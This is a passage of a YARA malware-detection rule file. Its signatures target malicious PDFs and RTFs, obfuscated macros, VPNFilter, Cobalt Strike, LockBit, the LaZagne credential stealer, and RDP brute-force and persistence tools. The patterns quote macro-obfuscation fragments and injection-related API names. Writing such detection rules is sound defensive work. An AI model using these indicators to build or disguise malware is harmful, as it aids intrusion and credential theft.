$ext_05 = /2e[46]3[46]f[46]d00/ nocase     // .com\x00
$ext_06 = /2e[46]3[46]8[46]d00/ nocase     // .chm\x00
$ext_07 = /2e[46]8[57]4[46]100/ nocase     // .hta\x00
$ext_08 = /2e[46]a[46]1[57]200/ nocase     // .jar\x00
$ext_09 = /2e[57]0[46]9[46]600/ nocase     // .pif\x00
$ext_10 = /2e[57]6[46]2[57]300/ nocase     // .vbs\x00
$ext_11 = /2e[57]6[46]2[46]500/ nocase     // .vbe\x00
condition:
$magic at 0 and $objstuff and any of ($ext*)
}
rule SSC_Unsafe_PDF_JS_InfectX
{
meta:
author         = "InQuest Labs"
description    = "This signature detects a PDF file that contains JavaScript. JavaScript can be used to customize PDFs by implementing objects, methods, and properties. While not inherently malicious, embedding JavaScript inside of a PDF is often used for malicious purposes such as malware delivery or exploitation."
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "www.sans.org/security-resources/malwarefaq/pdf-overview.php"
labs_reference = "N/A"
labs_pivot     = "N/A"
samples        = "c82e29dcaed3c71e05449cb9463f3efb7114ea22b6f45b16e09eae32db9f5bef"
strings:
$pdf_tag1 = /\x25\x50\x44\x46\x2d/
$js_tag1  = "/JavaScript" fullword nocase
$js_tag2  = "/JS"		  fullword nocase
condition:
$pdf_tag1 in (0..1024) and ($js_tag1 or $js_tag2) and filesize > 10KB and filesize < 7000KB
}
rule SSC_Unsafe_Crypted_JS_Command
{
strings:
$s1 = "/JS"
$s2 = "/JavaScript"
$s3 = "0x"
$magic  = { 4D 5A }
condition:
not $magic at 0 and filesize > 2KB and filesize < 1000KB and $s1 and $s2 and #s3 > 80
}
rule SSC_Unsafe_PDF_Authorx : PDF
{
meta:
author = "Glenn Edwards (@hiddenillusion)"
version = "0.1"
weight = 5
strings:
$magic = { 25 50 44 46 }
$reg0 = /Creator.?\(yen vaw\)/
$reg1 = /Title.?\(who cis\)/
$reg2 = /Author.?\(ser pes\)/
condition:
$magic at 0 and all of ($reg*)
}
rule SSC_SUSP_GObfuscateM21_X {
meta:
description = "Identifies binaries obfuscated with gobfuscate"
author = "James Quinn"
reference = "https://github.com/unixpickle/gobfuscate"
date = "2021-05-14"
score = 70
strings:
$s1 = { 0f b6 ?? ?? ?? 0f b6 ?? ?? ?? 31 D1 88 ?? ?? ?? 48 FF C0 48 83 f8 ?? 7c E7 48 C7 }
$s2 = { 0F b6 ?? ?? ?? 31 DA 88 ?? ?? ?? 40 83 ?? ?? 7D 09 0F B6 }
condition:
filesize < 40MB and any of them
}
rule SSC_xVPNFilter {
meta:
description = "Filter for 2nd stage malware used in VPNfilter attack"
author = "Christiaan Beek @ McAfee Advanced Threat Research"
date = "2018-05-23"
rule_version = "v1"
malware_type = "backdoor"
malware_family = "Backdoor:W32/VPNfilter"
actor_type = "Cybercrime"
actor_group = "Unknown"
reference = "https://blog.talosintelligence.com/2018/05/VPNFilter.html"
hash = "9eb6c779dbad1b717caa462d8e040852759436ed79cc2172692339bc62432387"
strings:
$s1 = "id-at-postalAddress" fullword ascii
$s2 = "/bin/shell" fullword ascii
$s3 = "/DZrtenNLQNiTrM9AM+vdqBpVoNq0qjU51Bx5rU2BXcFbXvI5MT9TNUhXwIDAQAB" fullword ascii
$s4 = "Usage does not match the keyUsage extension" fullword ascii
$s5 = "id-at-postalCode" fullword ascii
$s6 = "vTeY4KZMaUrveEel5tWZC94RSMKgxR6cyE1nBXyTQnDOGbfpNNgBKxyKbINWoOJU" fullword ascii
$s7 = "id-ce-extKeyUsage" fullword ascii
$s8 = "/f8wYwYDVR0jBFwwWoAUtFrkpbPe0lL2udWmlQ/rPrzH/f+hP6Q9MDsxCzAJBgNV" fullword ascii
$s9 = "/etc/config/hosts" fullword ascii
$s10 = "%s%-18s: %d bits" fullword ascii
$s11 = "id-ce-keyUsage" fullword ascii
$s12 = "Machine is not on the network" fullword ascii
$s13 = "No XENIX semaphores available" fullword ascii
$s14 = "No CSI structure available" fullword ascii
$s15 = "Name not unique on network" fullword ascii
condition:
( uint16(0) == 0x457f and
filesize < 500KB and
( 8 of them )) or
( all of them )
}
rule SSC_SedrecoDropper {
meta:
Author = "Intezer Analyze"
Reference = "https://apt-ecosystem.com"
strings:
$block_0 = { FF B? ?? ?? ?? ?? 6A ?? FF 3? ?? ?? ?? ?? FF 1? ?? ?? ?? ?? 8B ?? ?? ?? ?? ?? 89 ?? 85 ?? 0F 84 }
$block_1 = { 68 ?? ?? ?? ?? BA ?? ?? ?? ?? B9 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 ?? ?? 5? FF D? 8B ?? 85 ?? 0F 84 }
$block_3 = { 4C ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? FF 1? ?? ?? ?? ?? 85 ?? 0F 85 }
$block_4 = { 8D ?? ?? 5? 6A ?? 6A ?? FF 7? ?? FF 7? ?? FF 7? ?? FF 1? ?? ?? ?? ?? 85 ?? 0F 84 }
$block_5 = { 8B ?? 33 ?? F7 ?? 33 ?? 85 ?? 0F 95 ?? 33 ?? 33 ?? 89 ?? ?? 4? 03 ?? 89 ?? ?? 3B }
$block_6 = { 8B ?? ?? 8B ?? ?? 8D ?? ?? 5? 6A ?? 6A ?? 5? 5? 5? FF 1? ?? ?? ?? ?? 85 ?? 0F 84 }
$block_7 = { 8B ?? 33 ?? F7 ?? ?? 33 ?? 85 ?? 0F 95 ?? 33 ?? 89 ?? ?? 33 ?? 8D ?? ?? ?? EB }
$block_8 = { 4C ?? ?? ?? 41 ?? ?? ?? D1 ?? 49 ?? ?? ?? FF C? 8B ?? 8D ?? ?? 0F 1F }
$block_9 = { 8D ?? ?? ?? ?? ?? 5? 5? 6A ?? 5? 5? FF 1? ?? ?? ?? ?? 83 ?? ?? 0F 85 }
$block_10 = { 48 ?? ?? ?? ?? ?? ?? 48 ?? ?? FF 1? ?? ?? ?? ?? 85 ?? 0F 85 }
$block_11 = { 48 ?? ?? ?? ?? ?? ?? 48 ?? ?? FF 1? ?? ?? ?? ?? 85 ?? 0F 84 }
$block_12 = { 4C ?? ?? ?? ?? 4C ?? ?? ?? ?? 03 ?? 0F 1F ?? 44 ?? ?? 75 }
$block_13 = { 6A ?? 6A ?? 8D ?? ?? 5? 5? FF 1? ?? ?? ?? ?? 85 ?? 0F 84 }
$block_14 = { 6A ?? 6A ?? 6A ?? 5? FF 1? ?? ?? ?? ?? 83 ?? ?? ?? 0F 85 }
$block_15 = { 33 ?? 83 ?? ?? 0F 9F ?? 4? 83 ?? ?? 83 ?? ?? 89 ?? ?? EB }
$block_17 = { 0F B6 ?? ?? 01 ?? ?? 0F B6 ?? 01 ?? ?? 83 ?? ?? 4? 75 }
$block_18 = { 8D ?? ?? 4C ?? ?? ?? ?? 4C ?? ?? ?? ?? 03 ?? 0F 1F }
$block_19 = { 8B ?? ?? ?? ?? ?? 5? FF 1? ?? ?? ?? ?? 85 ?? 0F 84 }
$block_20 = { E8 ?? ?? ?? ?? 0F B6 ?? 03 ?? 88 ?? ?? FE ?? EB }
$block_21 = { BF ?? ?? ?? ?? B8 ?? ?? ?? ?? 3B ?? 0F 4E ?? EB }
condition:
12 of them
}
rule SSC_AutoGenXLS_MRC_TRJNx
{
meta:
author = "FileScan.IO Engine v1.1.0-e820145"
date = "2023-02-27"
sample = "7a500a9a5bea20c68064f32c5ac828d754391e54138b5360a385182a43b024da"
score = 0
tags = "macros"
isWeakRule = false
strings:
$magicBytes = {D0 CF 11 E0 A1 B1 1A E1}
//IOC patterns
$req0 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation"
$req1 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applications"
$req2 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Mic_VBA_PROJECT"
$req3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Microsoft "
$req4 = "ID=\"{25E8D5F2-D0B7-43AA-9684-C15371BC8261}\"\r\nDocument=ThisWorkbook/&H00000000\r\nDocument=Sheet1/&H00000000\r\nDocument=Sheet2/&H000"
$req5 = "N0{00020820-0000-0000-C000-000000000046}"
condition:
//
$magicBytes at 0 and filesize > 1000000 and filesize < 2288038 and all of ($req*)
}
rule SSC_Unsafe_PDFJS_SusX
{
meta:
author         = "InQuest Labs"
description    = "This signature detects a PDF file that contains JavaScript. JavaScript can be used to customize PDFs by implementing objects, methods, and properties. While not inherently malicious, embedding JavaScript inside of a PDF is often used for malicious purposes such as malware delivery or exploitation."
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "www.sans.org/security-resources/malwarefaq/pdf-overview.php"
labs_reference = "N/A"
labs_pivot     = "N/A"
samples        = "c82e29dcaed3c71e05449cb9463f3efb7114ea22b6f45b16e09eae32db9f5bef"
strings:
$pdf_tag1 = "%PDF" nocase
$js_tag1  = "/JavaScript" nocase
$js_tag2  = "/JS" nocase
condition:
$pdf_tag1 and #pdf_tag1 == 1 and ($js_tag1 or $js_tag2) and filesize > 7KB and filesize < 7000KB
}
rule SSC_RTF_Anti_AnlHeadX
{
meta:
author         = "InQuest Labs"
description    = "This signature detects strings found in malicious RTF documents"
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "http://decalage.info/rtf_tricks"
labs_reference = "N/A"
labs_pivot     = "N/A"
samples        = "08d7cef89f944e90fa8afb2114cd31dea1dd8de7f144ddccb6ce590c0738ffc5"
strings:
$r1 = /[\x0d\x0aa-f0-9\s]{64}(\{\\object\}|\\bin)[\x0d\x0aa-f0-9\s]{64}/ nocase
condition:
uint32(0) == 0x74725C7B and (not uint8(4) == 0x66 or $r1)
}
rule SSC_RTF_HObfuX
{
meta:
author         = "InQuest Labs"
description    = "This signature detects RTF files that have malformed headers. Threat actors often use such obscure methods to evade detection and deliver malicious payloads."
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "InQuest Labs Empirical Observations"
labs_reference = "N/A"
labs_pivot     = "N/A"
samples        = "f40ff37276a3da414c36789f640e38f3b3b574c6b5811cd3eb55a9cccb3eb9c8"
strings:
$bad_header = /^{\\rt[^f]/
condition:
$bad_header
}
rule SSC_LockbitX_MTX
{
strings:
$mutex = "XO1XADpO01" ascii wide
condition:
all of them
}
rule SSC_NET_GUID_DLL_Injection {
meta:
description = "Detects c# red/black-team tools via typelibguid"
reference = "https://github.com/ihack4falafel/DLL-Injection"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2020-12-13"
strings:
$typelibguid0 = "3d7e1433-f81a-428a-934f-7cc7fcf1149d" ascii nocase wide
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}
rule SSC_RDPWrap_WrapX
{
meta:
description = "Identifies RDP Wrapper, sometimes used by attackers to maintain persistence."
author = "@bartblaze"
date = "2020-05"
reference = "https://github.com/stascorp/rdpwrap"
tlp = "White"
strings:
$ = "rdpwrap.dll" ascii wide
$ = "rdpwrap.ini" ascii wide
$ = "RDP Wrapper" ascii wide
$ = "RDPWInst" ascii wide
$ = "Stas'M Corp." ascii wide
$ = "stascorp" ascii wide
condition:
2 of them and filesize > 50KB and filesize < 10000KB
}
rule SSC_NLBruteX
{
meta:
description = "Identifies NLBrute, an RDP brute-forcing tool."
author = "@bartblaze"
date = "2020-08"
tlp = "White"
strings:
$ = "SERVER:PORT@DOMAIN\\USER;PASSWORD" ascii wide
condition:
any of them and filesize > 2KB and filesize < 10000KB
}
rule SSC_LaZagneX
{
meta:
description = "Identifies LaZagne, credentials recovery project."
author = "@bartblaze"
date = "2020-01"
reference = "https://github.com/AlessandroZ/LaZagne"
tlp = "White"
strings:
$ = "[!] Specify a directory, not a file !" ascii wide
$ = "lazagne.config" ascii wide
$ = "lazagne.softwares" ascii wide
$ = "blazagne.exe.manifest" ascii wide
$ = "slaZagne" ascii wide fullword
condition:
2 of them  and filesize > 50KB and filesize < 10000KB
}
rule SSC_WMI_AVDx
{
strings:
$x = "wmi" nocase
$s1 = "AntiVirusProduct "
$s2 = " Get "
condition:
all of them and filesize > 40 and filesize < 10000KB
}
rule SSC_FE_LEGALSTRIKE_MACROx {
meta:
version=".1"
filetype="MACRO"
author="Ian.Ahl@fireeye.com @TekDefense - modified by Florian Roth"
date="2017-06-02"
description="This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7."
strings:
// OBSFUCATION
$ob1 = "ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)" ascii wide
// wscript
$wsobj1 = "Set Obj = CreateObject(\"WScript.Shell\")" ascii wide
$wsobj2 = "Obj.Run " ascii wide
condition:
all of them
}
rule SSC_HKTL_CobaltStrike_Beacon_SusP {
meta:
author = "Elastic"
description = "Identifies strings used in Cobalt Strike Beacon DLL"
reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
date = "2021-03-16"
strings:
$s1 = "%02d/%02d/%02d %02d:%02d:%02d"
$s2 = "Started service %s on %s"
$s3 = "%s as %s\\%s: %d"
condition:
2 of them
}
rule SSC_Unsafe_MekotioDLL64: MekotioFamily
{
meta:
description = "Mekotio DLL"
author = "Incibe"
version = "0.1"
strings:
$ep = {34 37 41 31 34 31 46 35 37 39 45 38 30 46 30 35 32 46 44 44 36 35 41 45 35 34 46 42 37 46 39 33 38 43 43 34 36 32 38 45 39}
$f1 = {35 45 46 33 33 45 46 33 32 41 33 32 35 35 44 37 30 34 33 35 45 42 36 32 38 32 42 44 36 32 39 32 35 35 38 35 41 42 45 42 32}
$f2 = {41 36 45 38 34 42 33 45 32 35 33 41 42 44 35 31 43 30 41 30 38 45 38 44 45 39 35 32 43 33 42 33}
condition:
$ep and $f1 and $f2
}
rule SSC_AutoGen_DropXSde9b3c01_BotX
{
meta:
author = "FileScan.IO Engine v1.1.0-e820145"
date = "2023-03-03"
sample = "de9b3c01991e357a349083f0db6af3e782f15e981e2bf0a16ba618252585923a"
score = 50
tags = "packed,shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "3-53b9-4441-ba9c-d69d4a4a6e38}\"></supportedOS>\r\n\t\t\t<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"></supportedOS>\r\n\t\t\t<"
$req1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><dependency><dependentAssembly><assemblyIdentity type=\""
$req2 = "https://thumbcacheviewer.github.io/"
//optional strings
$opt0 = "CLSIDFromString"
$opt1 = "COMDLG32.dll"
$opt2 = "CallWindowProcW"
$opt3 = "CloseClipboard"
$opt4 = "CoInitializeEx"
$opt5 = "CoTaskMemAlloc"
$opt6 = "CoTaskMemFree"
$opt7 = "CoUninitialize"
$opt8 = "CommandLineToArgvW"
$opt9 = "CreateDirectoryW"
$opt10 = "CreateFileW"
$opt11 = "CreateSemaphoreW"
$opt12 = "CreateWindowExA"
$opt13 = "CreateWindowExW"
$opt14 = "DefWindowProcW"
$opt15 = "DeleteCriticalSection"
$opt16 = "DestroyIcon"
$opt17 = "DestroyWindow"
$opt18 = "DispatchMessageW"
$opt19 = "DosDateTimeToFileTime"
$opt20 = "EmptyClipboard"
$opt21 = "EnableWindow"
$opt22 = "EnterCriticalSection"
$opt23 = "FileTimeToDosDateTime"
$opt24 = "FileTimeToSystemTime"
$opt25 = "FindFirstFileExW"
$opt26 = "FindNextFileW"
$opt27 = "FreeLibrary"
$opt28 = "GetCommandLineW"
$opt29 = "GetCurrentDirectoryW"
$opt30 = "GetCurrentProcess"
$opt31 = "GetCurrentProcessId"
$opt32 = "GetCurrentThreadId"
$opt33 = "GetCursorPos"
$opt34 = "GetFileAttributesW"
$opt35 = "GetFileInformationByHandle"
$opt36 = "GetFullPathNameW"
$opt37 = "GetKeyState"
$opt38 = "GetLastError"
$opt39 = "GetMessageW"
$opt40 = "GetMonitorInfoW"
$opt41 = "GetProcAddress"
$opt42 = "GetStartupInfoA"
$opt43 = "GetSystemMetrics"
$opt44 = "GetSystemTimeAsFileTime"
$opt45 = "GetTickCount"
$opt46 = "GetVolumeNameForVolumeMountPointW"
$opt47 = "GetWindowLongPtrW"
$opt48 = "GlobalAlloc"
$opt49 = "GlobalFree"
$opt50 = "GlobalLock"
$opt51 = "GlobalUnlock"
$opt52 = "InitializeCriticalSection"
$opt53 = "IsDebuggerPresent"
$opt54 = "IsWindowVisible"
$opt55 = "KERNEL32.dll"
$opt56 = "LdrAccessResource"
$opt57 = "LdrFindResource_U"
$opt58 = "LeaveCriticalSection"
$opt59 = "LoadCursorW"
$opt60 = "LoadLibraryW"
$opt61 = "MSVCR90.dll"
$opt62 = "MonitorFromWindow"
$opt63 = "MoveWindow"
$opt64 = "OleInitialize"
$opt65 = "OleUninitialize"
$opt66 = "Open a Thumbcache Database file"
$opt67 = "Open an Extensible Storage Engine Database file"
$opt68 = "OpenClipboard"
$opt69 = "PostQuitMessage"
$opt70 = "QueryPerformanceCounter"
$opt71 = "RegisterClassExW"
$opt72 = "ReleaseSemaphore"
$opt73 = "RtlCaptureContext"
$opt74 = "RtlLookupFunctionEntry"
$opt75 = "RtlVirtualUnwind"
$opt76 = "SHBrowseForFolderW"
$opt77 = "SHELL32.dll"
$opt78 = "SHGetFileInfoA"
$opt79 = "SHGetPathFromIDListW"
$opt80 = "Select All"
$opt81 = "Select All\tCtrl+A"
$opt82 = "Select a location to save all the file(s)."
$opt83 = "Select a location to save the selected file(s)."
$opt84 = "Select a location to scan."
$opt85 = "SendMessageA"
$opt86 = "SendMessageW"
$opt87 = "SendNotifyMessageA"
$opt88 = "SetClipboardData"
$opt89 = "SetErrorMode"
$opt90 = "SetFilePointer"
$opt91 = "SetForegroundWindow"
$opt92 = "SetUnhandledExceptionFilter"
$opt93 = "SetWindowLongPtrW"
$opt94 = "SetWindowPos"
$opt95 = "ShellExecuteW"
$opt96 = "ShowWindow"
$opt97 = "SystemParametersInfoW"
$opt98 = "TerminateProcess"
$opt99 = "TranslateMessage"
$opt100 = "USER32.dll"
$opt101 = "UnhandledExceptionFilter"
$opt102 = "VerSetConditionMask"
$opt103 = "VerifyVersionInfoW"
$opt104 = "VirtualAlloc"
$opt105 = "WaitForSingleObject"
$opt106 = "_beginthreadex"
$opt107 = "_endthreadex"
$opt108 = "gdiplus.dll"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 200000 and filesize < 559321 and all of ($req*) and 50 of ($opt*)
}
rule SSC_AutoGen_VMDG808f89c9_TRJNx
{
meta:
author = "FileScan.IO Engine v1.1.0-e820145"
date = "2023-03-03"
sample = "808f89c9a6d019a759e5486ed72d386404d2b320cc7bb4cbb37b1026c6e516a8"
score = 75
tags = "anti-debug,anti-vm,greyware,packed"
isWeakRule = true
strings:
//IOC patterns
$req0 = "22f0395f938c880f4f8708cf3274629f5717c7e0bb3de3ece84d75d586a6ecab" nocase
$req1 = "80920ce9c1790648b2f7e7731cebf5c0" nocase
//optional strings
$opt0 = "ADVAPI32.dll"
$opt1 = "AdjustTokenPrivileges"
$opt2 = "AreFileApisANSI"
$opt3 = "CoCreateInstance"
$opt4 = "CoInitializeEx"
$opt5 = "CoInitializeSecurity"
$opt6 = "CoSetProxyBlanket"
$opt7 = "CoUninitialize"
$opt8 = "CreateEventA"
$opt9 = "CreateEventW"
$opt10 = "CreateFileA"
$opt11 = "CreateFileW"
$opt12 = "CreateProcessA"
$opt13 = "CreateToolhelp32Snapshot"
$opt14 = "CryptAcquireContext"
$opt15 = "CryptAcquireContextA"
$opt16 = "CryptGenRandom"
$opt17 = "CryptReleaseContext"
$opt18 = "DecodePointer"
$opt19 = "DeleteCriticalSection"
$opt20 = "DllInstall"
$opt21 = "DllRegisterServer"
$opt22 = "EncodePointer"
$opt23 = "EnterCriticalSection"
$opt24 = "EnumResourceLanguagesA"
$opt25 = "EnumResourceLanguagesW"
$opt26 = "EnumResourceNamesA"
$opt27 = "EnumResourceNamesW"
$opt28 = "EnumResourceTypesA"
$opt29 = "EnumResourceTypesW"
$opt30 = "ExitProcess"
$opt31 = "FileTimeToSystemTime"
$opt32 = "FindResourceExA"
$opt33 = "FindResourceExW"
$opt34 = "FlushFileBuffers"
$opt35 = "FormatMessageA"
$opt36 = "FreeEnvironmentStringsA"
$opt37 = "FreeEnvironmentStringsW"
$opt38 = "FreeLibrary"
$opt39 = "GetActiveWindow"
$opt40 = "GetCommandLineA"
$opt41 = "GetConsoleCP"
$opt42 = "GetConsoleMode"
$opt43 = "GetConsoleOutputCP"
$opt44 = "GetCurrentDirectoryA"
$opt45 = "GetCurrentProcess"
$opt46 = "GetCurrentProcessId"
$opt47 = "GetCurrentThread"
$opt48 = "GetCurrentThreadId"
$opt49 = "GetEnvironmentStrings"
$opt50 = "GetEnvironmentStringsW"
$opt51 = "GetEnvironmentVariableA"
$opt52 = "GetFileAttributesW"
$opt53 = "GetFileInformationByHandleEx"
$opt54 = "GetFileSize"
$opt55 = "GetFileType"
$opt56 = "GetLastActivePopup"
$opt57 = "GetLastError"
$opt58 = "GetLocaleInfoA"
$opt59 = "GetModuleFileNameA"
$opt60 = "GetModuleFileNameW"
$opt61 = "GetModuleHandleA"
$opt62 = "GetModuleHandleW"
$opt63 = "GetProcAddress"
$opt64 = "GetProcessAffinityMask"
$opt65 = "GetProcessWindowStation"
$opt66 = "GetStartupInfoA"
$opt67 = "GetStdHandle"
$opt68 = "GetStringTypeA"
$opt69 = "GetStringTypeW"
$opt70 = "GetSystemDirectoryA"
$opt71 = "GetSystemInfo"
$opt72 = "GetSystemTimeAsFileTime"
$opt73 = "GetTempPathW"
$opt74 = "GetThreadLocale"
$opt75 = "GetTickCount"
$opt76 = "GetUserDefaultLCID"
$opt77 = "GetUserObjectInformationA"
$opt78 = "GetUserObjectInformationW"
$opt79 = "GetUsername"
$opt80 = "GetWindowsDirectoryA"
$opt81 = "GlobalFree"
$opt82 = "HeapCreate"
$opt83 = "HeapDestroy"
$opt84 = "HeapReAlloc"
$opt85 = "HeapSetInformation"
$opt86 = "InitializeCriticalSection"
$opt87 = "InitializeCriticalSectionAndSpinCount"
$opt88 = "InitializeCriticalSectionEx"
$opt89 = "InitializeSListHead"
$opt90 = "Injection Error GetModuleHandleADownloading UpdaGetExitCodeThreaGetModuleInformaNtAllocateVirtuaGetCurrentThreadNtWriteVirtualMe"
$opt91 = "IsDebuggerPresent"
$opt92 = "IsProcessorFeaturePresent"
$opt93 = "KERNEL32.dll"
$opt94 = "LCMapStringA"
$opt95 = "LCMapStringW"
$opt96 = "LeaveCriticalSection"
$opt97 = "LoadLibraryA"
$opt98 = "LoadLibraryW"
$opt99 = "LoadResource"
$opt100 = "LocalAlloc"
$opt101 = "LookupPrivilegeValueA"
$opt102 = "MSVCP140.dll"
$opt103 = "OLEAUT32.dll"
$opt104 = "OpenProcessToken"
$opt105 = "OpenThread"
$opt106 = "OutputDebugStringW"
$opt107 = "Process32First"
$opt108 = "Process32Next"
$opt109 = "QueryPerformanceCounter"
$opt110 = "QueryPerformanceFrequency"
$opt111 = "RaiseException"
$opt112 = "ReadProcessMemory"
$opt113 = "RegCloseKey"
$opt114 = "RegEnumValueA"
$opt115 = "RegOpenKeyA"
$opt116 = "ResetEvent"
$opt117 = "ResumeThread"
$opt118 = "RtlCaptureContext"
$opt119 = "RtlLookupFunctionEntry"
$opt120 = "RtlPcToFileHeader"
$opt121 = "RtlVirtualUnwind"
$opt122 = "SetFileInformationByHandle"
$opt123 = "SetFilePointer"
$opt124 = "SetHandleCount"
$opt125 = "SetLastError"
$opt126 = "SetProcessAffinityMask"
$opt127 = "SetStdHandle"
$opt128 = "SetThreadAffinityMask"
$opt129 = "SetUnhandledExceptionFilter"
$opt130 = "SleepConditionVariableCS"
$opt131 = "SuspendThread"
$opt132 = "SystemTimeToFileTime"
$opt133 = "TerminateProcess"
$opt134 = "Thread32First"
$opt135 = "Thread32Next"
$opt136 = "USER32.DLL"
$opt137 = "USER32.dll"
$opt138 = "UnhandledExceptionFilter"
$opt139 = "VCRUNTIME140.dll"
$opt140 = "VirtualAlloc"
$opt141 = "VirtualFree"
$opt142 = "VirtualFreeEx"
$opt143 = "VirtualProtect"
$opt144 = "VirtualProtectEx"
$opt145 = "WINHTTP.dll"
$opt146 = "WS2_32.dll"
$opt147 = "WSAConnectByNameA"
$opt148 = "WTSAPI32.dll"
$opt149 = "WTSSendMessageW"
$opt150 = "WaitForSingleObjectEx"
$opt151 = "WakeAllConditionVariable"
$opt152 = "Win32_BaseBoard"
$opt153 = "Win32_Processor"
$opt154 = "WinHttpAddRequestHeaders"
$opt155 = "WinHttpConnect"
$opt156 = "WinHttpOpen"
$opt157 = "WinHttpOpenRequest"
$opt158 = "WinHttpQueryDataAvailable"
$opt159 = "WinHttpReadData"
$opt160 = "WinHttpReceiveResponse"
$opt161 = "WinHttpSendRequest"
$opt162 = "WriteConsoleA"
$opt163 = "WriteConsoleW"
$opt164 = "WriteProcessMemory"
$opt165 = "_beginthreadex"
$opt166 = "kernel32.dll"
$opt167 = "mscoree.dll"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 4460416 and filesize < 9999999 and all of ($req*) and 70 of ($opt*)
}
rule SSC_AutoGen_SusPEVC_Unsafe
{
meta:
author = "FileScan.IO Engine v1.1.0-c8d0e05"
date = "2023-03-08"
sample = "a5292b01d3f73f488b74bd680a1d4af191ff261251b63eefe53df74fc61db26a"
score = 75
tags = "advpack.dll,CAB,evasive,fingerprint,installer,packed,rundll32.exe,setupapi.dll,shell32.dll,wscript.exe"
isWeakRule = true
strings:
//IOC patterns
$req0 = "Command.com /c %s"
$req1 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
$req2 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
//optional strings
$opt0 = "ADVAPI32.dll"
$opt1 = "AdjustTokenPrivileges"
$opt2 = "AllocateAndInitializeSid"
$opt3 = "COMCTL32.dll"
$opt4 = "CallWindowProcA"
$opt5 = "CheckTokenMembership"
$opt6 = "Control Panel\\Desktop\\ResourceLocale"
$opt7 = "CreateDirectoryA"
$opt8 = "CreateEventA"
$opt9 = "CreateFileA"
$opt10 = "CreateMutexA"
$opt11 = "CreateProcessA"
$opt12 = "CreateThread"
$opt13 = "DecryptFileA"
$opt14 = "DeleteFileA"
$opt15 = "DispatchMessageA"
$opt16 = "DosDateTimeToFileTime"
$opt17 = "EnableWindow"
$opt18 = "EnumResourceLanguagesA"
$opt19 = "ExitProcess"
$opt20 = "ExitWindowsEx"
$opt21 = "ExpandEnvironmentStringsA"
$opt22 = "FindFirstFileA"
$opt23 = "FindNextFileA"
$opt24 = "FindResourceA"
$opt25 = "FormatMessageA"
$opt26 = "FreeLibrary"
$opt27 = "FreeResource"
$opt28 = "GetCommandLineA"
$opt29 = "GetCurrentDirectoryA"
$opt30 = "GetCurrentProcess"
$opt31 = "GetCurrentProcessId"
$opt32 = "GetCurrentThreadId"
$opt33 = "GetDesktopWindow"
$opt34 = "GetDiskFreeSpaceA"
$opt35 = "GetDriveTypeA"
$opt36 = "GetExitCodeProcess"
$opt37 = "GetFileAttributesA"
$opt38 = "GetFileVersionInfoA"
$opt39 = "GetFileVersionInfoSizeA"
$opt40 = "GetLastError"
$opt41 = "GetModuleFileNameA"
$opt42 = "GetModuleHandleA"
$opt43 = "GetPrivateProfileIntA"
$opt44 = "GetPrivateProfileStringA"
$opt45 = "GetProcAddress"
$opt46 = "GetShortPathNameA"
$opt47 = "GetStartupInfoA"
$opt48 = "GetSystemDirectoryA"
$opt49 = "GetSystemInfo"
$opt50 = "GetSystemMetrics"
$opt51 = "GetSystemTimeAsFileTime"
$opt52 = "GetTempFileNameA"
$opt53 = "GetTempPathA"
$opt54 = "GetTickCount"
$opt55 = "GetTokenInformation"
$opt56 = "GetVersionExA"
$opt57 = "GetVolumeInformationA"
$opt58 = "GetWindowLongA"
$opt59 = "GetWindowsDirectoryA"
$opt60 = "GlobalAlloc"
$opt61 = "GlobalFree"
$opt62 = "GlobalLock"
$opt63 = "GlobalUnlock"
$opt64 = "KERNEL32.dll"
$opt65 = "LoadLibraryA"
$opt66 = "LoadLibraryExA"
$opt67 = "LoadResource"
$opt68 = "LoadStringA"
$opt69 = "LocalAlloc"
$opt70 = "LocalFileTimeToFileTime"
$opt71 = "LockResource"
$opt72 = "LookupPrivilegeValueA"
$opt73 = "MsgWaitForMultipleObjects"
$opt74 = "OpenProcessToken"
$opt75 = "PeekMessageA"
$opt76 = "QueryPerformanceCounter"
$opt77 = "RUNPROGRAM"
$opt78 = "RegCloseKey"
$opt79 = "RegCreateKeyExA"
$opt80 = "RegDeleteValueA"
$opt81 = "RegOpenKeyExA"
$opt82 = "RegQueryInfoKeyA"
$opt83 = "RegQueryValueExA"
$opt84 = "RegSetValueExA"
$opt85 = "RemoveDirectoryA"
$opt86 = "ResetEvent"
$opt87 = "SHBrowseForFolder"
$opt88 = "SHELL32.DLL"
$opt89 = "SHGetPathFromIDList"
$opt90 = "SHGetSpecialFolderLocation"
$opt91 = "SHOWWINDOW"
$opt92 = "SendMessageA"
$opt93 = "SetCurrentDirectoryA"
$opt94 = "SetFileAttributesA"
$opt95 = "SetFilePointer"
$opt96 = "SetFileTime"
